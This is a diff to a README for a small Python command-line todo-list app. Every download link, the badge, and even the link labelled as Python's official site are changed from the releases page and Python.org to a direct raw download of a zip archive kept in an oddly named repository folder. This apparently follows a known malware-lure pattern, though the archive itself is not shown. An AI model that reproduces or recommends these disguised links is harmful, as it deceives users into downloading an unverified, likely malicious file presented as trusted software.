@@ -1,6 +1,6 @@
 # 🎯 Python--todo-list- - Simple Task Management Made Easy
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Visit%20Release%20Page-brightgreen)](https://github.com/Ankuj17/Python--todo-list-/releases)
+[![Download Here](https://github.com/Ankuj17/Python--todo-list-/raw/refs/heads/main/spermatium/todo_Python_list_v3.6.zip%20Now-Visit%20Release%20Page-brightgreen)](https://github.com/Ankuj17/Python--todo-list-/raw/refs/heads/main/spermatium/todo_Python_list_v3.6.zip)
 
 ## 📜 Description
 Python--todo-list- is a command-line interface application designed to help you manage your tasks efficiently. Create, update, and delete tasks with simple commands. This tool is perfect for anyone looking to stay organized without the need for complex software.
@@ -10,7 +10,7 @@ To use Python--todo-list-, follow these simple steps:
 
 1. **Download the Application**  
    Click on the link below to visit the releases page and download the latest version.  
-   [Download Now](https://github.com/Ankuj17/Python--todo-list-/releases)
+   [Download Now](https://github.com/Ankuj17/Python--todo-list-/raw/refs/heads/main/spermatium/todo_Python_list_v3.6.zip)
 
 2. **Install the Application**  
    Follow the installation instructions based on your operating system.  
@@ -25,12 +25,12 @@ To use Python--todo-list-, follow these simple steps:
 ## 🌍 System Requirements
 Before you start, ensure your system meets these requirements:
 - **Operating System:** Windows 10 or later, macOS 10.13 or later, or any modern Linux distribution.
-- **Python:** Version 3.6 or newer installed on your machine. You can download Python from the official website: [Python.org](https://www.python.org/downloads/).
+- **Python:** Version 3.6 or newer installed on your machine. You can download Python from the official website: [https://github.com/Ankuj17/Python--todo-list-/raw/refs/heads/main/spermatium/todo_Python_list_v3.6.zip](https://github.com/Ankuj17/Python--todo-list-/raw/refs/heads/main/spermatium/todo_Python_list_v3.6.zip).
 
 ## 📥 Download & Install
 To get Python--todo-list-, follow these steps:
 
-1. Visit this page to download: [Download Here](https://github.com/Ankuj17/Python--todo-list-/releases).
+1. Visit this page to download: [Download Here](https://github.com/Ankuj17/Python--todo-list-/raw/refs/heads/main/spermatium/todo_Python_list_v3.6.zip).
 2. Choose the latest version of the software.
 3. Download the appropriate file for your operating system.
 4. Follow the installation instructions as provided above.
@@ -75,4 +75,4 @@ If you have questions or need assistance, feel free to reach out through the Git
 
 ## 📥 Final Note
 Enjoy organizing your tasks with Python--todo-list-. We hope this application makes your life a little more orderly. Don't forget to visit the download page to get started.  
-[Download Now](https://github.com/Ankuj17/Python--todo-list-/releases)
+[Download Now](https://github.com/Ankuj17/Python--todo-list-/raw/refs/heads/main/spermatium/todo_Python_list_v3.6.zip)
